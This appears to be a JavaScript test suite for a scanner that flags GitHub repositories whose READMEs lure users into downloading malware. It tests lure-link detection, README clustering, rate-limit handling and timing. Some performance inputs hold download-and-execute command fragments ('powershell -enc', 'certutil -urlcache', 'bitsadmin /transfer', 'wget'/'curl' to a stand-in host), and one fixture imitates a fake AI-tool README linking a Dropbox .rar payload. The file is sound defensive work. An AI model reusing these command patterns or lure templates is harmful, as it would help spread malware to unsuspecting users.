    `powershell -enc ${encoded('Write-Host ok ok ok')} `.repeat(8_000),
    `sh ${'-a '.repeat(150_000)}`,
    `sh ${'-sh '.repeat(130_000)}`,
    `wget https://x.io/ ${'ab.'.repeat(170_000)}`,
    `curl -O https://x.io/ ${'a-b.c.'.repeat(85_000)}`,
    `certutil https://x.io/ ${'-urlcache-https://'.repeat(29_000)}`,
    `bitsadmin https://x.io/ ${'/transfer-https://'.repeat(29_000)}`,
    'a |\n'.repeat(130_000),
    `x\n${'| y\n'.repeat(130_000)}`,
    `\`\`\`\nx\n${'| y\n'.repeat(130_000)}\`\`\``,
    'a\\\n'.repeat(170_000),
    'a`\n'.repeat(170_000),
    '关。'.repeat(260_000),
    '. '.repeat(260_000),
    `${'끄 '.repeat(100_000)}백신`,
    `desactiv ${'a '.repeat(200_000)}`,
  ]) {
    const started = performance.now();
    classifyReadme(text, CODELESS);
    assert.ok(performance.now() - started < 1000, `${text.slice(0, 16)}… took too long`);
  }
});

test('저장 실패는 그 저장소에만 머물고 나머지 판정이 모두 끝난 뒤 반환한다', async () => {
  const saved = [];
  const warnings = [];
  let releaseSlow;
  const slow = new Promise((resolve) => { releaseSlow = resolve; });
  const instance = createReadmeScanner({
    model: {
      findVerdicts: async () => new Map(),
      refreshClusters: async () => 0,
      upsertVerdict: async (row) => {
        if (row.github_id === 1) throw Object.assign(new Error('deadlock'), { code: 'ER_LOCK_DEADLOCK' });
        saved.push(row);
      },
    },
    fetchReadme: async (octokit, owner, name) => {
      if (name === 'slow') { setTimeout(releaseSlow, 20); await slow; }
      return CLUSTER_README;
    },
    log: { warn: (message) => warnings.push(message) },
    now: () => SCANNED,
  });
  await instance.scanRepos({}, [
    { github_id: 1, owner: 'o', name: 'first', pushed_at: PUSHED },
    { github_id: 2, owner: 'o', name: 'slow', pushed_at: PUSHED },
  ]);
  assert.deepEqual(saved.map((row) => [row.github_id, row.verdict]), [[2, 'malicious']]);
  assert.deepEqual(warnings, ['[readme-scan] github_id=1 store=ER_LOCK_DEADLOCK']);
});

test('README 요청 시작은 동시 실행이어도 minIntervalMs 이상 떨어진다', async () => {
  const starts = [];
  const instance = createReadmeScanner({
    model: { findVerdicts: async () => new Map(), upsertVerdict: async () => {}, refreshClusters: async () => 0 },
    fetchReadme: async () => { starts.push(performance.now()); return '# ok'; },
    log: { warn() {} },
    concurrency: 4,
    minIntervalMs: 30,
  });
  await instance.scanRepos({}, [1, 2, 3, 4, 5].map((id) => ({ github_id: id, owner: 'o', name: `r${id}`, pushed_at: PUSHED })));
  assert.equal(starts.length, 5);
  const sorted = [...starts].sort((a, b) => a - b);
  // 타이머가 1ms 일찍 깨어날 수 있어 2ms 여유를 둔다.
  sorted.slice(1).forEach((start, index) => assert.ok(start - sorted[index] >= 28, `${sorted}`));
});

test('2차 한도(403 rate limit·429)에 걸리면 그 저장소는 R2.2대로 unknown, 아직 요청하지 않은 저장소는 판정 없이 다음 수집으로 넘긴다', async () => {
  const saved = [];
  const warnings = [];
  let calls = 0;
  const instance = createReadmeScanner({
    model: { findVerdicts: async () => new Map(), upsertVerdict: async (row) => { saved.push(row); }, refreshClusters: async () => 0 },
    fetchReadme: async () => {
      calls++;
      if (calls === 2) throw Object.assign(new Error('You have exceeded a secondary rate limit'), { status: 403, response: { headers: {} } });
      return '# ok';
    },
    log: { warn: (message) => warnings.push(message) },
    concurrency: 1,
    minIntervalMs: 0,
  });
  const result = await instance.scanRepos({}, [1, 2, 3, 4].map((id) => ({ github_id: id, owner: 'o', name: `r${id}`, pushed_at: PUSHED })));
  assert.equal(calls, 2);
  assert.deepEqual(result, { scanned: 1, malicious: 0, unknown: 1, skipped: 2, cluster_hidden: 0 });
  assert.deepEqual(saved.map((row) => [row.github_id, row.verdict]), [[1, 'clean'], [2, 'unknown']]);
  assert.equal(warnings.length, 1);
  assert.match(warnings[0], /rate limited status=403/);
});

test('rate limit이 아닌 403(접근 차단 저장소)은 그 저장소만 unknown으로 남기고 계속한다', async () => {
  const saved = [];
  const instance = createReadmeScanner({
    model: { findVerdicts: async () => new Map(), upsertVerdict: async (row) => { saved.push(row); }, refreshClusters: async () => 0 },
    fetchReadme: async (octokit, owner, name) => {
      if (name === 'r1') throw Object.assign(new Error('Repository access blocked'), { status: 403, response: { headers: { 'x-ratelimit-remaining': '4000' } } });
      return '# ok';
    },
    log: { warn() {} },
    concurrency: 1,
    minIntervalMs: 0,
  });
  const result = await instance.scanRepos({}, [1, 2].map((id) => ({ github_id: id, owner: 'o', name: `r${id}`, pushed_at: PUSHED })));
  assert.deepEqual(result, { scanned: 1, malicious: 0, unknown: 1, skipped: 0, cluster_hidden: 0 });
  assert.deepEqual(saved.map((row) => [row.github_id, row.verdict]), [[1, 'unknown'], [2, 'clean']]);
});

// ── 배포형 캠페인(D-014·D-015) ──
const PITCH = 'This assistant automates browser tasks, writes small scripts and keeps your daily workflow tidy without any setup. ';
const DROPBOX = 'https://www.dropbox.com/scl/fi/kvqr16k9/ManusStudio2.0.rar?rlkey=iif54&st=6sg0&dl=1';
const campaignReadme = (name) => `# ${name}\n\n[![Download](https://img.shields.io/badge/GET-blue)](${DROPBOX})\n\n${PITCH.repeat(5)}\n`;
const HEADINGS = ['Why', 'Without | With', 'Quick Start', 'Features', 'How It Works', 'Usage', 'Configuration', 'Troubleshooting & FAQ', 'Contributing', 'License'];
const skeletonReadme = (title, sentence, headings = HEADINGS) => [`# ${title}`, ...headings.map((h) => `## ${h}\n\n${sentence}\n`)].join('\n');

test('본문 키: 소유자·저장소 이름만 다른 같은 README는 같은 키이고, 글자·숫자 300자 미만이면 키가 없다', () => {
  const a = readmeTraits(campaignReadme('manus--ai').replace('Download', 'Download alpha-owner'), { owner: 'alpha-owner', name: 'manus--ai' });
  const b = readmeTraits(campaignReadme('ai--manus').replace('Download', 'Download Beta_Owner'), { owner: 'Beta_Owner', name: 'ai--manus' });
  assert.match(a.textKey, /^[0-9a-f]{64}$/);
  assert.equal(a.textKey, b.textKey);
  // 띄어쓰기·줄바꿈만 다른 복사본도 같은 키다(글자·숫자만 비교).
  const spaced = readmeTraits(campaignReadme('manus--ai').replace(/ /g, '  ').replace('Download', 'Download alpha-owner'), { owner: 'alpha-owner', name: 'manus--ai' });
  assert.equal(spaced.textKey, a.textKey);
  assert.notEqual(readmeTraits(`${campaignReadme('x')}one more line`, { owner: 'o', name: 'x' }).textKey, a.textKey);
  assert.equal(readmeTraits(`# tool\n${'Short text. '.repeat(20)}`, { owner: 'o', name: 'tool' }).textKey, null);
  // 짧은 소유자 이름도 지운다. 이름만 다른 복사본은 같은 키다.
  const short = (owner) => readmeTraits(`${owner}/xyz tool by ${owner}. ${PITCH.repeat(4)}`, { owner, name: 'xyz' }).textKey;
  assert.equal(short('ab'), short('cd'));
  assert.deepEqual(readmeTraits(null, { owner: 'o', name: 'r' }), { textKey: null, skeletonKey: null, lure: false, archiveFilehostUrl: null });
});

test('골격 키: 문장이 달라도 첫 제목을 뺀 제목 순서가 같으면 같은 키이고, 8개 미만·코드블록 안 제목은 세지 않는다', () => {
  const lab = readmeTraits(skeletonReadme('blender-ai-copilot-lab', 'Agents split the brief into assignments with acceptance criteria.'), { owner: 'precyg', name: 'blender-ai-copilot-lab' });
  const assets = readmeTraits(skeletonReadme('Blender AI Copilot Assets', 'Search three free libraries from inside the chat and import.'), { owner: 'zovul', name: 'blender-ai-copilot-assets' });
  assert.match(lab.skeletonKey, /^[0-9a-f]{64}$/);
  assert.equal(lab.skeletonKey, assets.skeletonKey);
  assert.match(lab.textKey, /^[0-9a-f]{64}$/);
  assert.notEqual(lab.textKey, assets.textKey);
  assert.equal(readmeTraits(skeletonReadme('t', 's', HEADINGS.slice(0, 7)), { owner: 'o', name: 't' }).skeletonKey, null);
  const fenced = `# t\n\`\`\`sh\n${HEADINGS.map((h) => `# ${h}`).join('\n')}\n\`\`\`\n`;
  assert.equal(readmeTraits(fenced, { owner: 'o', name: 't' }).skeletonKey, null);
  // 숫자·기호만 있는 제목은 빈 제목으로 빼고 센다.
  assert.equal(readmeTraits(skeletonReadme('t', 's', [...HEADINGS.slice(0, 7), '1.0', '2.0']), { owner: 'o', name: 't' }).skeletonKey, null);
});

test('미끼 표시: 압축·실행 파일 URL, 파일호스팅 URL, 같은 줄의 Releases와 파일 이름 — 그 밖의 정상 README는 아니다', () => {
  const repo = { owner: 'o', name: 'r' };
  assert.equal(readmeTraits('Get [setup](https://example.com/files/setup.exe?x=1).', repo).lure, true);
  assert.equal(readmeTraits('Notes: https://mega.nz/folder/AbC#key', repo).lure, true);
  assert.equal(readmeTraits('1. Download **`mcp-for-blender-pro.zip`** from [Releases](../../releases/latest).', repo).lure, true);
  for (const text of [
    '# tool\nInstall with `npm i tool`. See https://github.com/o/r/releases for notes.',
    'Download the latest release from the Releases page.',
    'Build `tool.zip` yourself with `make dist`.',
    'Short links like https://bit.ly/abc.zip are not resolved.'.replace('abc.zip', 'abc'),
  ]) assert.equal(readmeTraits(text, repo).lure, false, text);
});

test('압축·실행 파일 파일호스팅 링크: 경로가 확장자로 끝나거나 같은 줄에 파일 이름이 있어야 하고, 폴더 링크는 아니다', () => {
  const repo = { owner: 'o', name: 'r' };
  assert.equal(readmeTraits(`[GET](${DROPBOX})`, repo).archiveFilehostUrl, DROPBOX);
  assert.equal(readmeTraits('Download `Tool.7z`: https://mega.nz/file/AbC#key', repo).archiveFilehostUrl, 'https://mega.nz/file/AbC#key');
  assert.equal(readmeTraits('Get it at https://dl.dropboxusercontent.com/s/x/Setup.msi', repo).archiveFilehostUrl, 'https://dl.dropboxusercontent.com/s/x/Setup.msi');
  const folder = readmeTraits('Assets folder: https://mega.nz/folder/AbC#key', repo);
  assert.equal(folder.lure, true);
  assert.equal(folder.archiveFilehostUrl, null);
  assert.equal(readmeTraits('Binary: https://example.com/files/tool.exe', repo).archiveFilehostUrl, null);
  assert.equal(readmeTraits('Mirror: https://notdropbox.com/x/tool.rar', repo).archiveFilehostUrl, null);
  // 스킴 대소문자는 링크 판정에 영향을 주지 않는다.
  assert.equal(readmeTraits('[a.zip](HTTPS://www.mediafire.com/file/x)', repo).archiveFilehostUrl, 'HTTPS://www.mediafire.com/file/x');
  assert.equal(readmeTraits('Get Https://example.com/a/setup.EXE', repo).lure, true);
});

test('미끼 표시(D-016): 소유자 자신의 GitHub Pages 링크와 download 안내가 함께 있으면 미끼다', () => {
  const repo = { owner: 'Alex-Wells-65', name: 'iobit-driver-booster-desktop' };
  const pagesReadme = (host) => `# Tool\n\n## 01 · ⬇️ Download\n\n<a href="https://${host}/iobit-driver-booster-desktop/"><img src="docs/buttons/installer-card.svg"></a>\n`;
  const own = readmeTraits(pagesReadme('alex-wells-65.github.io'), repo);
  assert.equal(own.lure, true);
  assert.equal(own.archiveFilehostUrl, null);
  assert.equal(readmeTraits(pagesReadme('ALEX-WELLS-65.GITHUB.IO'), repo).lure, true);
  // 다른 소유자의 Pages, 이름 일부만 같은 호스트, download 언급 없음은 미끼가 아니다.
  for (const host of ['someone-else.github.io', 'alex-wells-65x.github.io', 'xalex-wells-65.github.io', 'alex-wells-65.github.io.evil.net']) {
    assert.equal(readmeTraits(pagesReadme(host), repo).lure, false, host);
  }
  assert.equal(readmeTraits('# Tool\n\nDocs: https://alex-wells-65.github.io/iobit-driver-booster-desktop/\n', repo).lure, false);
  assert.equal(readmeTraits(pagesReadme('alex-wells-65.github.io'), { owner: '', name: 'x' }).lure, false);
});

test('교차 리뷰 회귀: URL 사용자 정보 속 호스트, 이중 확장자, 더 긴 펜스 안의 제목을 미끼·골격으로 오인하지 않는다', () => {
  const repo = { owner: 'alpha-owner', name: 'r' };
  const confused = readmeTraits('Download sample.zip: https://dropbox.com@downloads.example.org/manual.txt', repo);
  assert.equal(confused.archiveFilehostUrl, null);
  assert.equal(confused.lure, false);
  assert.equal(readmeTraits('Download: https://alpha-owner.github.io@docs.example.org/help', repo).lure, false);
  assert.equal(readmeTraits('Get https://files.example.org:8443/setup.zip', repo).lure, true);
  // 표준 URL 파서 기준: 잘못된 포트는 링크가 아니고, percent-encoding·전각 호스트는 정규화한 호스트로 본다.
  assert.equal(readmeTraits('Get https://www.dropbox.com:not-a-port/setup.zip', repo).archiveFilehostUrl, null);
  assert.equal(readmeTraits('Get https://www.dropbox.com:99999/setup.zip', repo).lure, false);
  assert.equal(readmeTraits('Get https://%64ropbox.com/s/x/setup.zip', repo).archiveFilehostUrl, 'https://%64ropbox.com/s/x/setup.zip');
  assert.equal(readmeTraits('Get https://ｄｒｏｐｂｏｘ.com/s/x/setup.zip', repo).archiveFilehostUrl, 'https://ｄｒｏｐｂｏｘ.com/s/x/setup.zip');
  assert.equal(readmeTraits('Manifest: https://www.dropbox.com/s/abc/tool.exe.manifest', repo).archiveFilehostUrl, null);
  assert.equal(readmeTraits('Checksums `tool.zip.sha256` in releases', repo).lure, false);
  const nested = ['# Project', '````markdown', '```sh', 'echo hi', '```', ...HEADINGS.map((h) => `## ${h}`), '````', 'Done.'].join('\n');
  assert.equal(readmeTraits(nested, repo).skeletonKey, null);
  // 같은 길이 이상의 같은 문자 펜스만 닫는다.
  const tilde = ['# P', '~~~', ...HEADINGS.map((h) => `## ${h}`), '```', '~~~~', ...HEADINGS.map((h) => `## ${h}`)].join('\n');
  assert.match(readmeTraits(tilde, repo).skeletonKey, /^[0-9a-f]{64}$/);
});

const NEW_OWNER = new Date(SCANNED.getTime() - 30 * 86_400_000);
const OLD_OWNER = new Date(SCANNED.getTime() - (NEW_ACCOUNT_DAYS + 1) * 86_400_000);
const codelessTarget = (id, owner, name, extra = {}) => ({ github_id: id, owner, name, pushed_at: PUSHED, language: null, forks: 0, size: 10, ...extra });

test('미끼 링크 규칙: 신생 계정 + 코드 없음 + 압축 파일호스팅 링크면 malicious와 근거, 소유자 조회는 그때만 1번', async () => {
  const { instance, saved, ownerCalls } = scanner({
    readmes: { 'NewOwner/manus--ai': campaignReadme('manus--ai'), 'old/manus--ai': campaignReadme('manus--ai') },
    owners: { NewOwner: NEW_OWNER, old: OLD_OWNER },
    minIntervalMs: 0,
  });
  const result = await instance.scanRepos({}, [codelessTarget(1, 'NewOwner', 'manus--ai'), codelessTarget(2, 'old', 'manus--ai')]);
  assert.deepEqual(result, { scanned: 2, malicious: 1, unknown: 0, skipped: 0, cluster_hidden: 0 });
  assert.deepEqual(ownerCalls.sort(), ['NewOwner', 'old']);
  const bad = saved.find((row) => row.github_id === 1);
  assert.equal(bad.verdict, 'malicious');
  assert.equal(bad.evidence, `파일호스팅 링크 ${DROPBOX} · 소유자 계정 생성 ${NEW_OWNER.toISOString().slice(0, 10)}`);
  assert.equal(bad.owner_login, 'newowner');
  assert.equal(bad.lure, true);
  assert.match(bad.text_key, /^[0-9a-f]{64}$/);
  assert.equal(saved.find((row) => row.github_id === 2).verdict, 'clean');
});

test('미끼 링크 규칙: 코드 있음·forks 1·메타 없음·폴더 링크·미끼 없음이면 소유자를 조회하지 않고 clean', async () => {
  const folder = `# tool\n\nAssets: https://mega.nz/folder/AbC#key\n\n${PITCH.repeat(4)}`;
  const { instance, saved, ownerCalls } = scanner({
    readmes: {
      'n/a': campaignReadme('a'), 'n/b': campaignReadme('b'), 'n/c': campaignReadme('c'), 'n/d': folder, 'n/e': `# e\n${PITCH.repeat(4)}`,
    },
    owners: { n: NEW_OWNER },
    minIntervalMs: 0,
  });
  await instance.scanRepos({}, [
    codelessTarget(1, 'n', 'a', { language: 'Go' }),
    codelessTarget(2, 'n', 'b', { forks: 1 }),
    { github_id: 3, owner: 'n', name: 'c', pushed_at: PUSHED },
    codelessTarget(4, 'n', 'd'),
    codelessTarget(5, 'n', 'e'),
  ]);
  assert.deepEqual(ownerCalls, []);
  assert.deepEqual(saved.map((row) => row.verdict), ['clean', 'clean', 'clean', 'clean', 'clean']);
  assert.equal(saved.find((row) => row.github_id === 4).lure, true);
  assert.equal(saved.find((row) => row.github_id === 5).lure, false);
});

test('소유자 조회 실패·생성일 없음은 README 조회 실패와 같다: 새 저장소는 unknown, 기존 판정은 유지', async () => {
  const unreadable = Object.assign(new Error('owner created_at unavailable'), { code: 'OWNER_CREATED_AT_UNAVAILABLE' });
  const { instance, saved, warnings } = scanner({
    existing: [{ github_id: 2, verdict: 'malicious', rule_version: RULE_VERSION - 1, repo_pushed_at: new Date(PUSHED) }],
    readmes: { 'gone/a': campaignReadme('a'), 'odd/b': campaignReadme('b') },
    owners: { gone: Object.assign(new Error('Not Found'), { status: 404 }), odd: unreadable },
    minIntervalMs: 0,
  });
  const result = await instance.scanRepos({}, [codelessTarget(1, 'gone', 'a'), codelessTarget(2, 'odd', 'b')]);
  assert.deepEqual(result, { scanned: 0, malicious: 0, unknown: 1, skipped: 0, cluster_hidden: 0 });
  assert.deepEqual(saved.map((row) => [row.github_id, row.verdict]), [[1, 'unknown']]);
  assert.equal(saved[0].text_key, undefined);
  assert.deepEqual(warnings.sort(), ['[readme-scan] github_id=1 status=404', '[readme-scan] github_id=2 status=OWNER_CREATED_AT_UNAVAILABLE']);
});

test('fetchOwnerCreatedAt은 users.getByUsername의 created_at을 Date로 돌려주고, 없거나 읽을 수 없으면 던진다', async () => {
  const octokit = (data) => ({ rest: { users: { getByUsername: async ({ username }) => ({ data: { login: username, ...data } }) } } });
  assert.equal((await fetchOwnerCreatedAt(octokit({ created_at: '2026-10-14T01:02:03Z' }), 'x')).toISOString(), '2026-10-14T01:02:03.000Z');
  await assert.rejects(fetchOwnerCreatedAt(octokit({}), 'x'), { code: 'OWNER_CREATED_AT_UNAVAILABLE' });
  await assert.rejects(fetchOwnerCreatedAt(octokit({ created_at: 'not a date' }), 'x'), { code: 'OWNER_CREATED_AT_UNAVAILABLE' });
});

test('소유자 조회가 2차 한도에 걸리면 그 저장소는 unknown, 남은 저장소는 다음 수집으로 넘긴다', async () => {
  const limited = Object.assign(new Error('You have exceeded a secondary rate limit'), { status: 403, response: { headers: {} } });
  const { instance, saved, fetched } = scanner({
    readmes: { 'l/a': campaignReadme('a'), 'l/b': campaignReadme('b') },
    owners: { l: limited },
    minIntervalMs: 0,
  });
  const result = await instance.scanRepos({}, [codelessTarget(1, 'l', 'a'), codelessTarget(2, 'l', 'b')]);
  assert.equal(result.unknown + result.skipped, 2);
  assert.ok(result.unknown >= 1);
  assert.ok(fetched.length <= 2);
  assert.ok(saved.every((row) => row.verdict === 'unknown'));
});

test('소유자 조회도 README 요청과 같은 minIntervalMs 간격으로 시작한다', async () => {
  const starts = [];
  const instance = createReadmeScanner({
    model: { findVerdicts: async () => new Map(), upsertVerdict: async () => {}, refreshClusters: async () => 0 },
    fetchReadme: async () => { starts.push(performance.now()); return campaignReadme('a'); },
    fetchOwnerCreatedAt: async () => { starts.push(performance.now()); return NEW_OWNER; },
    log: { warn() {} },
    now: () => SCANNED,
    concurrency: 4,
    minIntervalMs: 30,
  });
  await instance.scanRepos({}, [1, 2, 3].map((id) => codelessTarget(id, `o${id}`, `r${id}`)));
  assert.equal(starts.length, 6);
  const sorted = [...starts].sort((a, b) => a - b);
  sorted.slice(1).forEach((start, index) => assert.ok(start - sorted[index] >= 28, `${sorted}`));
});

test('군집 재계산: 판정 뒤 1번 부르고 결과를 돌려주며, 모두 건너뛰어도 부르고, 대상이 없으면 부르지 않는다', async () => {
  let calls = 0;
  const refreshClusters = async () => { calls++; return 7; };
  const first = scanner({ readmes: { 'o/a': '# a' }, refreshClusters, minIntervalMs: 0 });
  assert.equal((await first.instance.scanRepos({}, [{ github_id: 1, owner: 'o', name: 'a', pushed_at: PUSHED }])).cluster_hidden, 7);
  const skipped = scanner({
    existing: [{ github_id: 1, verdict: 'clean', rule_version: RULE_VERSION, repo_pushed_at: new Date(PUSHED) }], refreshClusters, minIntervalMs: 0,
  });
  const result = await skipped.instance.scanRepos({}, [{ github_id: 1, owner: 'o', name: 'a', pushed_at: PUSHED }]);
  assert.deepEqual(result, { scanned: 0, malicious: 0, unknown: 0, skipped: 1, cluster_hidden: 7 });
  assert.equal(calls, 2);
  await skipped.instance.scanRepos({}, [{ github_id: 'x' }]);
  assert.equal(calls, 2);
});

test('군집 재계산이 실패해도 판정 저장과 결과는 그대로이고 오류 원문 없이 경고만 남긴다', async () => {
  const { instance, saved, warnings } = scanner({
    readmes: { 'o/a': '# a' },
    refreshClusters: async () => { throw Object.assign(new Error('Lock wait timeout tok-secret'), { code: 'ER_LOCK_WAIT_TIMEOUT' }); },
    minIntervalMs: 0,
  });
  const result = await instance.scanRepos({}, [{ github_id: 1, owner: 'o', name: 'a', pushed_at: PUSHED }]);
  assert.deepEqual(result, { scanned: 1, malicious: 0, unknown: 0, skipped: 0, cluster_hidden: null });
  assert.equal(saved.length, 1);
  assert.deepEqual(warnings, ['[readme-scan] cluster refresh=ER_LOCK_WAIT_TIMEOUT']);
});

test('README 판정 정보 계산도 512KB 입력에서 1초 안에 끝난다', () => {
  for (const text of [
    `${'# h\n'.repeat(60_000)}`,
    `${'https://www.dropbox.com/scl/fi/'.repeat(17_000)}`,
    `${'a.'.repeat(260_000)}zip releases`,
    `${'x'.repeat(524_288)}`,
    // 교차 리뷰 회귀: 단독 CR·U+2028 뒤 펜스·제목, 잘못된 URL 반복, 끝 문장부호만 긴 URL.
    `${'`'.repeat(524_000)}\rX`,
    `${'~'.repeat(524_000)}\u2028X`,
    `# ${' '.repeat(524_000)}\rX`,
    `${'http://[ '.repeat(58_000)}`,
    `${`https://a.b/${'.'.repeat(1990)} `.repeat(260)}`,
  ]) {
    const started = performance.now();
    readmeTraits(text.slice(0, 524_288), { owner: 'o', name: 'r' });
    assert.ok(performance.now() - started < 1000, `${text.slice(0, 16)}… took too long`);
  }
});
